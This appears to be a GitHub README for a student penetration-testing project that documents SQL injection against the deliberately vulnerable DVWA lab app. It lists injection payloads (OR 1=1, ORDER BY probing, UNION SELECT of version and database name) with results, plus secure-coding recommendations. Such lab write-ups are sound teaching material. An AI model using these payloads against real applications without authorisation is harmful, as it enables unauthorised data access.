 DVWA SQL Injection Assessment

 Project Overview
This project demonstrates the identification and exploitation of SQL Injection vulnerabilities in a controlled lab environment using Damn Vulnerable Web Application (DVWA).  
The goal is to showcase penetration testing methodology, highlight insecure coding practices, and recommend secure development techniques.



 Environment Setup
- Platform: DVWA (PHP/MySQL)
- OS: Kali Linux
- Database: MariaDB 11.8.5 (Debian)
- Security Level: Low (for demonstration purposes)



 Exploitation Steps
1. Setup DVWA
   - Default credentials: `admin / password`  
   - Security level set to Low

2. Confirm Vulnerability  
   - Payload: `' OR 1=1 #`  
   - Result: All records returned  SQL Injection confirmed

3. Determine Query Structure  
   - Payloads: `ORDER BY 1`, `ORDER BY 2`, `ORDER BY 3`  
   - Result: Query involves two fields

4. Identify DBMS Version
   - Payload: `UNION SELECT 1, VERSION()#`  
   - Result: `11.8.5-MariaDB-4 from Debian`

5. Retrieve Database Name 
   - Payload: `UNION SELECT 1, DATABASE()#`  
   - Result: `dvwa`



 Screenshots
Screenshots of each step are available in the [`/screenshots`](./screenshots) folder.



 Key Takeaways
- SQL Injection allows attackers to manipulate backend queries and access unauthorized data.
- Secure coding practices are essential:
  - Use parameterized queries and prepared statements
  - Apply input validation
  - Conduct regular vulnerability assessments



 Skills Demonstrated
- Web application penetration testing
- SQL Injection exploitation methodology
- Vulnerability analysis and reporting
- Secure coding recommendations



 Documentation
Full step‑by‑step report: [SQL Injection Vulnerability on DVWA (PDF)](./docs/SQL_injection_vulnerability_on_DVWA.pdf)


